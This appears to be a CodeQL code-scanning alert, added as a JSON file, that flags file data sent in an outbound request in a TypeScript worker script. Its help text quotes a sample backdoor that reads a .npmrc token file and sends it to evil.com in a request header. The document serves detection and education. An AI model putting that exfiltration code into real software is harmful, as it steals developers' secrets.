@@ -1,0 +1,53 @@
+{
+  "number": 10868,
+  "created_at": "2026-03-29T00:50:45Z",
+  "updated_at": "2026-03-29T00:50:45Z",
+  "url": "https://api.github.com/repos/MoneyCat-inc/otel-ops-pack/code-scanning/alerts/10868",
+  "html_url": "https://github.com/MoneyCat-inc/otel-ops-pack/security/code-scanning/10868",
+  "state": "open",
+  "fixed_at": null,
+  "dismissed_by": null,
+  "dismissed_at": null,
+  "dismissed_reason": null,
+  "dismissed_comment": null,
+  "rule": {
+    "id": "js/file-access-to-http",
+    "severity": "warning",
+    "description": "File data in outbound network request",
+    "name": "js/file-access-to-http",
+    "tags": [
+      "external/cwe/cwe-200",
+      "security"
+    ],
+    "full_description": "Directly sending file data in an outbound network request can indicate unauthorized information disclosure.",
+    "help": "# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n",
+    "security_severity_level": "medium"
+  },
+  "tool": {
+    "name": "CodeQL",
+    "guid": null,
+    "version": "2.26.2"
+  },
+  "most_recent_instance": {
+    "ref": "refs/heads/main",
+    "analysis_key": ".github/workflows/security-scan.yml:codeql",
+    "environment": "{\"language\":\"javascript\"}",
+    "category": "/language:javascript",
+    "state": "open",
+    "commit_sha": "fd18a6caa8b843d9b29031e3d6c09c0277c20ecb",
+    "message": {
+      "text": "Outbound network request depends on file data."
+    },
+    "location": {
+      "path": "scripts/ingest-worker.ts",
+      "start_line": 119,
+      "end_line": 119,
+      "start_column": 35,
+      "end_column": 49
+    },
+    "classifications": []
+  },
+  "instances_url": "https://api.github.com/repos/MoneyCat-inc/otel-ops-pack/code-scanning/alerts/10868/instances",
+  "dismissal_approved_by": null,
+  "assignees": []
+}
